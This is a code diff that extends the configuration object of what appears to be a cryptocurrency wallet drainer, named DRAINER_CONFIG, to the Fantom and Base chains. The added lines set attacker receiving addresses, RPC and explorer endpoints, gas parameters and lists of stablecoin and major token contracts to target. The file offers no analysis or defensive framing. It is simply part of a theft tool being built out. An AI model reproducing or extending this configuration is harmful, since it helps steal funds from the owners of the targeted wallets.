@@ -8,6 +8,8 @@ window.DRAINER_CONFIG = {
         AVALANCHE: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
         ARBITRUM: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
         OPTIMISM: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
+        FANTOM: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
+        BASE: "0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE",
         SOL: "KnxWLb2G6fRy2Ef9n4zm4ZssFi2zozoKazHn8FCg8vx",
         TRX: "THJkNgqXcmeCtB2WbHjWMw4oNyavejFBsy"
     },
@@ -49,6 +51,16 @@ window.DRAINER_CONFIG = {
         OPTIMISM: {
             rpcUrl: "https://optimism.llamarpc.com",
             explorerApi: "https://api-optimistic.etherscan.io/api",
+            defiLlama: "https://api.llama.fi"
+        },
+        FANTOM: {
+            rpcUrl: "https://rpc.ftm.tools/",
+            explorerApi: "https://api.ftmscan.com/api",
+            defiLlama: "https://api.llama.fi"
+        },
+        BASE: {
+            rpcUrl: "https://mainnet.base.org/",
+            explorerApi: "https://api.basescan.org/api",
             defiLlama: "https://api.llama.fi"
         },
         
@@ -124,6 +136,24 @@ window.DRAINER_CONFIG = {
             rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
             explorerUrl: "https://snowtrace.io/tx/",
             gasMultiplier: 1.2,
+            gasLimit: { transfer: 21000, token: 80000 }
+        },
+        FANTOM: {
+            name: "Fantom",
+            chainId: 250,
+            currency: "FTM",
+            rpcUrl: "https://rpc.ftm.tools/",
+            explorerUrl: "https://ftmscan.com/tx/",
+            gasMultiplier: 1.3,
+            gasLimit: { transfer: 21000, token: 80000 }
+        },
+        BASE: {
+            name: "Base",
+            chainId: 8453,
+            currency: "ETH",
+            rpcUrl: "https://mainnet.base.org/",
+            explorerUrl: "https://basescan.org/tx/",
+            gasMultiplier: 1.1,
             gasLimit: { transfer: 21000, token: 80000 }
         },
         SOL: {
@@ -260,6 +290,34 @@ window.DRAINER_CONFIG = {
             { symbol: "JOE", address: "0x6e84a6216eA6dACC71eE8E6b0a5B7322EEbC0fDd", decimals: 18 },
             { symbol: "LINK", address: "0x5947BB275c521040541495dAFa3286f33A438605", decimals: 18 },
             { symbol: "AAVE", address: "0x63a72806098Bd3D9520cC43356dD78afe5d386D9", decimals: 18 }
+        ],
+        FANTOM: [
+            // Stablecoins
+            { symbol: "USDT", address: "0x049d68029B510FFfc5F3fe4B96c530f5f8da936a", decimals: 6 },
+            { symbol: "USDC", address: "0x04068DA6C83AFCFA0e13ba15A6696662335D5B75", decimals: 6 },
+            { symbol: "DAI", address: "0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Befd2", decimals: 18 },
+            { symbol: "FRAX", address: "0xdc301622e02bf9f31c61b4622987E1d1E1b13907", decimals: 18 },
+            // Major Assets
+            { symbol: "WFTM", address: "0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83", decimals: 18 },
+            { symbol: "WETH", address: "0x74b23882a30290451A17c44f4F05a28b3B0D405d", decimals: 18 },
+            { symbol: "WBTC", address: "0x321162Cd933E2Be498Cd2267a90534A804051b11", decimals: 8 },
+            // DEX & DeFi
+            { symbol: "LINK", address: "0xb3654dc3D10Ea7645f8319668E8F54d2574FBdC8", decimals: 18 },
+            { symbol: "AAVE", address: "0x6A07B4B9cb5ef6dc32655d52fe50Ffb7c1fb46fF", decimals: 18 },
+            { symbol: "SUSHI", address: "0xae75A438b2E0cB8428f5A7ADdda1B6D3c4001c33", decimals: 18 }
+        ],
+        BASE: [
+            // Stablecoins
+            { symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b1566469c3d", decimals: 6 },
+            { symbol: "USDT", address: "0xfde4C96c1286F3626A49fa202dcD5dD9a9Db13f6", decimals: 6 },
+            { symbol: "DAI", address: "0x50c5725949A6F68dCa686A0a52b452FEE1D2B02B", decimals: 18 },
+            // Major Assets
+            { symbol: "WETH", address: "0x4200000000000000000000000000000000000006", decimals: 18 },
+            { symbol: "WBTC", address: "0xd9aAEc86B65D86f6A7B650e858E4de5dd0E81e63", decimals: 8 },
+            // DEX & DeFi
+            { symbol: "UNI", address: "0x6fd9d7AD17242c41f7131d257212c54A0Be56e7F", decimals: 18 },
+            { symbol: "AAVE", address: "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0", decimals: 18 },
+            { symbol: "LINK", address: "0xe80d347DF1124Df565909e6537984199ECD031cA", decimals: 18 }
         ],
         SOL: [
             // Stablecoins
